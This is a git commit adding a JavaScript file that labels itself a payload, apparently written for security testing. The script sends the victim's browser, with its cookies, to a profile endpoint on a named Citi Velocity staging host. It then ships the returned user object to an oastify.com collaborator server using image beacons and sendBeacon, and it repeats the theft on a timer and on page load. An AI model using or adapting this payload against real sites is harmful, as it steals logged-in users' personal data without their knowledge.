395db82cea2944cedeb1df0d1d4890918d838551
AYukusawa <40502081+AYukusawa@users.noreply.github.com>
2025-11-18 06:17:55 +0100

    Create script.js

---
+++ script.js
@@ -0,0 +1,46 @@
+(function() {
+     console.log('[PAYLOAD STARTED]');
+
+     const attackerServer = 'https://8dmzi1s1ywtqm03kvxyjawh8fzlq9jx8.oastify.com';
+
+     (new Image()).src = attackerServer + '/ping?status=loaded';
+
+     function callEndpoint() {
+       fetch('https://uat.citivelocity.com/portal-profile-service/initNewPortalData', {
+         method: 'GET',
+         credentials: 'include',
+         headers: {
+           'Accept': 'application/json',
+           'Content-Type': 'application/json'
+         }
+       })
+       .then(response => response.json())
+       .then(data => {
+         const userObject = data.user;
+         if (userObject) {
+           const beacon = new Image();
+           beacon.src = attackerServer + '/exfil?user=' + encodeURIComponent(JSON.stringify(userObject));
+
+           if (navigator.sendBeacon) {
+             navigator.sendBeacon(
+               attackerServer + '/user',
+               JSON.stringify(userObject)
+             );
+           }
+         }
+       })
+       .catch(err => {
+         (new Image()).src = attackerServer + '/error?msg=' + encodeURIComponent(err.message);
+       });
+     }
+
+     callEndpoint();
+     setTimeout(callEndpoint, 500);
+     setTimeout(callEndpoint, 1500);
+
+     if (document.readyState === 'loading') {
+       document.addEventListener('DOMContentLoaded', callEndpoint);
+     } else {
+       window.addEventListener('load', callEndpoint);
+     }
+   })();
